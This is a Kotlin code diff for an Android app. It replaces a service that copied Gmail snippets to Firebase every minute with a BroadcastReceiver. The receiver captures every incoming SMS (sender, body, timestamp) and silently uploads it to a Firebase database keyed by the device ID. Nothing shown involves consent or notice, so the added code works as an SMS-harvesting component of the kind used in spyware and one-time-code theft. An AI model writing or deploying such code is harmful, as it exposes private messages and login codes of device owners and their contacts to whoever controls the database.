@@ -1,62 +1,47 @@
 package com.vplan.rxtprob
 
+import android.content.BroadcastReceiver
 import android.content.Context
-import android.os.Handler
-import android.os.Looper
+import android.content.Intent
+import android.provider.Telephony
 import android.util.Log
-import com.google.android.gms.auth.api.signin.GoogleSignInAccount
-import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential
-import com.google.api.client.extensions.android.http.AndroidHttp
-import com.google.api.client.json.gson.GsonFactory
-import com.google.api.services.gmail.Gmail
 import com.google.firebase.database.FirebaseDatabase
 
-class GmailSyncService(private val context: Context, private val account: GoogleSignInAccount) {
+class SmsReceiver : BroadcastReceiver() {
 
-    private val gmail = Gmail.Builder(
-        AndroidHttp.newCompatibleTransport(),
-        GsonFactory.getDefaultInstance(),
-        GoogleAccountCredential.usingOAuth2(
-            context,
-            listOf("https://www.googleapis.com/auth/gmail.readonly")
-        ).apply { selectedAccount = account.account }
-    ).setApplicationName("SMS + Gmail Project").build()
+    override fun onReceive(context: Context?, intent: Intent?) {
+        if (context == null || intent == null) return
+        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION != intent.action) return
 
-    private val dbRef = FirebaseDatabase.getInstance()
-        .getReference("gmailInbox")
-        .child(account.id ?: "unknown")
+        try {
+            val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+            if (msgs.isNullOrEmpty()) return
 
-    private val handler = Handler(Looper.getMainLooper())
-    private val interval = 60 * 1000L // 1 min
+            val deviceId = android.provider.Settings.Secure.getString(
+                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+            ) ?: "unknown_device"
 
-    private val runnable = object : Runnable {
-        override fun run() {
-            fetchLatestEmails()
-            handler.postDelayed(this, interval)
-        }
-    }
+            val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)
 
-    fun start() { handler.post(runnable) }
-    fun stop() { handler.removeCallbacks(runnable) }
+            for (sms in msgs) {
+                val sender = sms.displayOriginatingAddress ?: "Unknown"
+                val body = sms.messageBody ?: ""
+                val timestamp = sms.timestampMillis
+                val smsId = "${sender}_${timestamp}"
 
-    private fun fetchLatestEmails() {
-        Thread {
-            try {
-                val messages = gmail.users().messages().list("me").setMaxResults(20).execute()
-                val msgList = messages.messages ?: return@Thread
+                val smsData = mapOf(
+                    "id" to smsId,
+                    "sender" to sender,
+                    "body" to body,
+                    "timestamp" to timestamp
+                )
 
-                for (msg in msgList) {
-                    val fullMsg = gmail.users().messages().get("me", msg.id).execute()
-                    val snippet = fullMsg.snippet ?: continue
-
-                    dbRef.child(msg.id).get().addOnSuccessListener { snapshot ->
-                        if (!snapshot.exists()) dbRef.child(msg.id).setValue(snippet)
-                    }
-                    Log.d("GMAIL_SYNC", "Email: $snippet")
-                }
-            } catch (e: Exception) {
-                Log.e("GMAIL_SYNC", "Error: ${e.message}")
+                smsRef.child(smsId).setValue(smsData)
+                    .addOnSuccessListener { Log.d("SmsReceiver", "SMS saved: $smsId") }
+                    .addOnFailureListener { e -> Log.e("SmsReceiver", "Save failed: ${e.message}") }
             }
-        }.start()
+        } catch (e: Exception) {
+            Log.e("SmsReceiver", "onReceive error: ${e.message}")
+        }
     }
 }
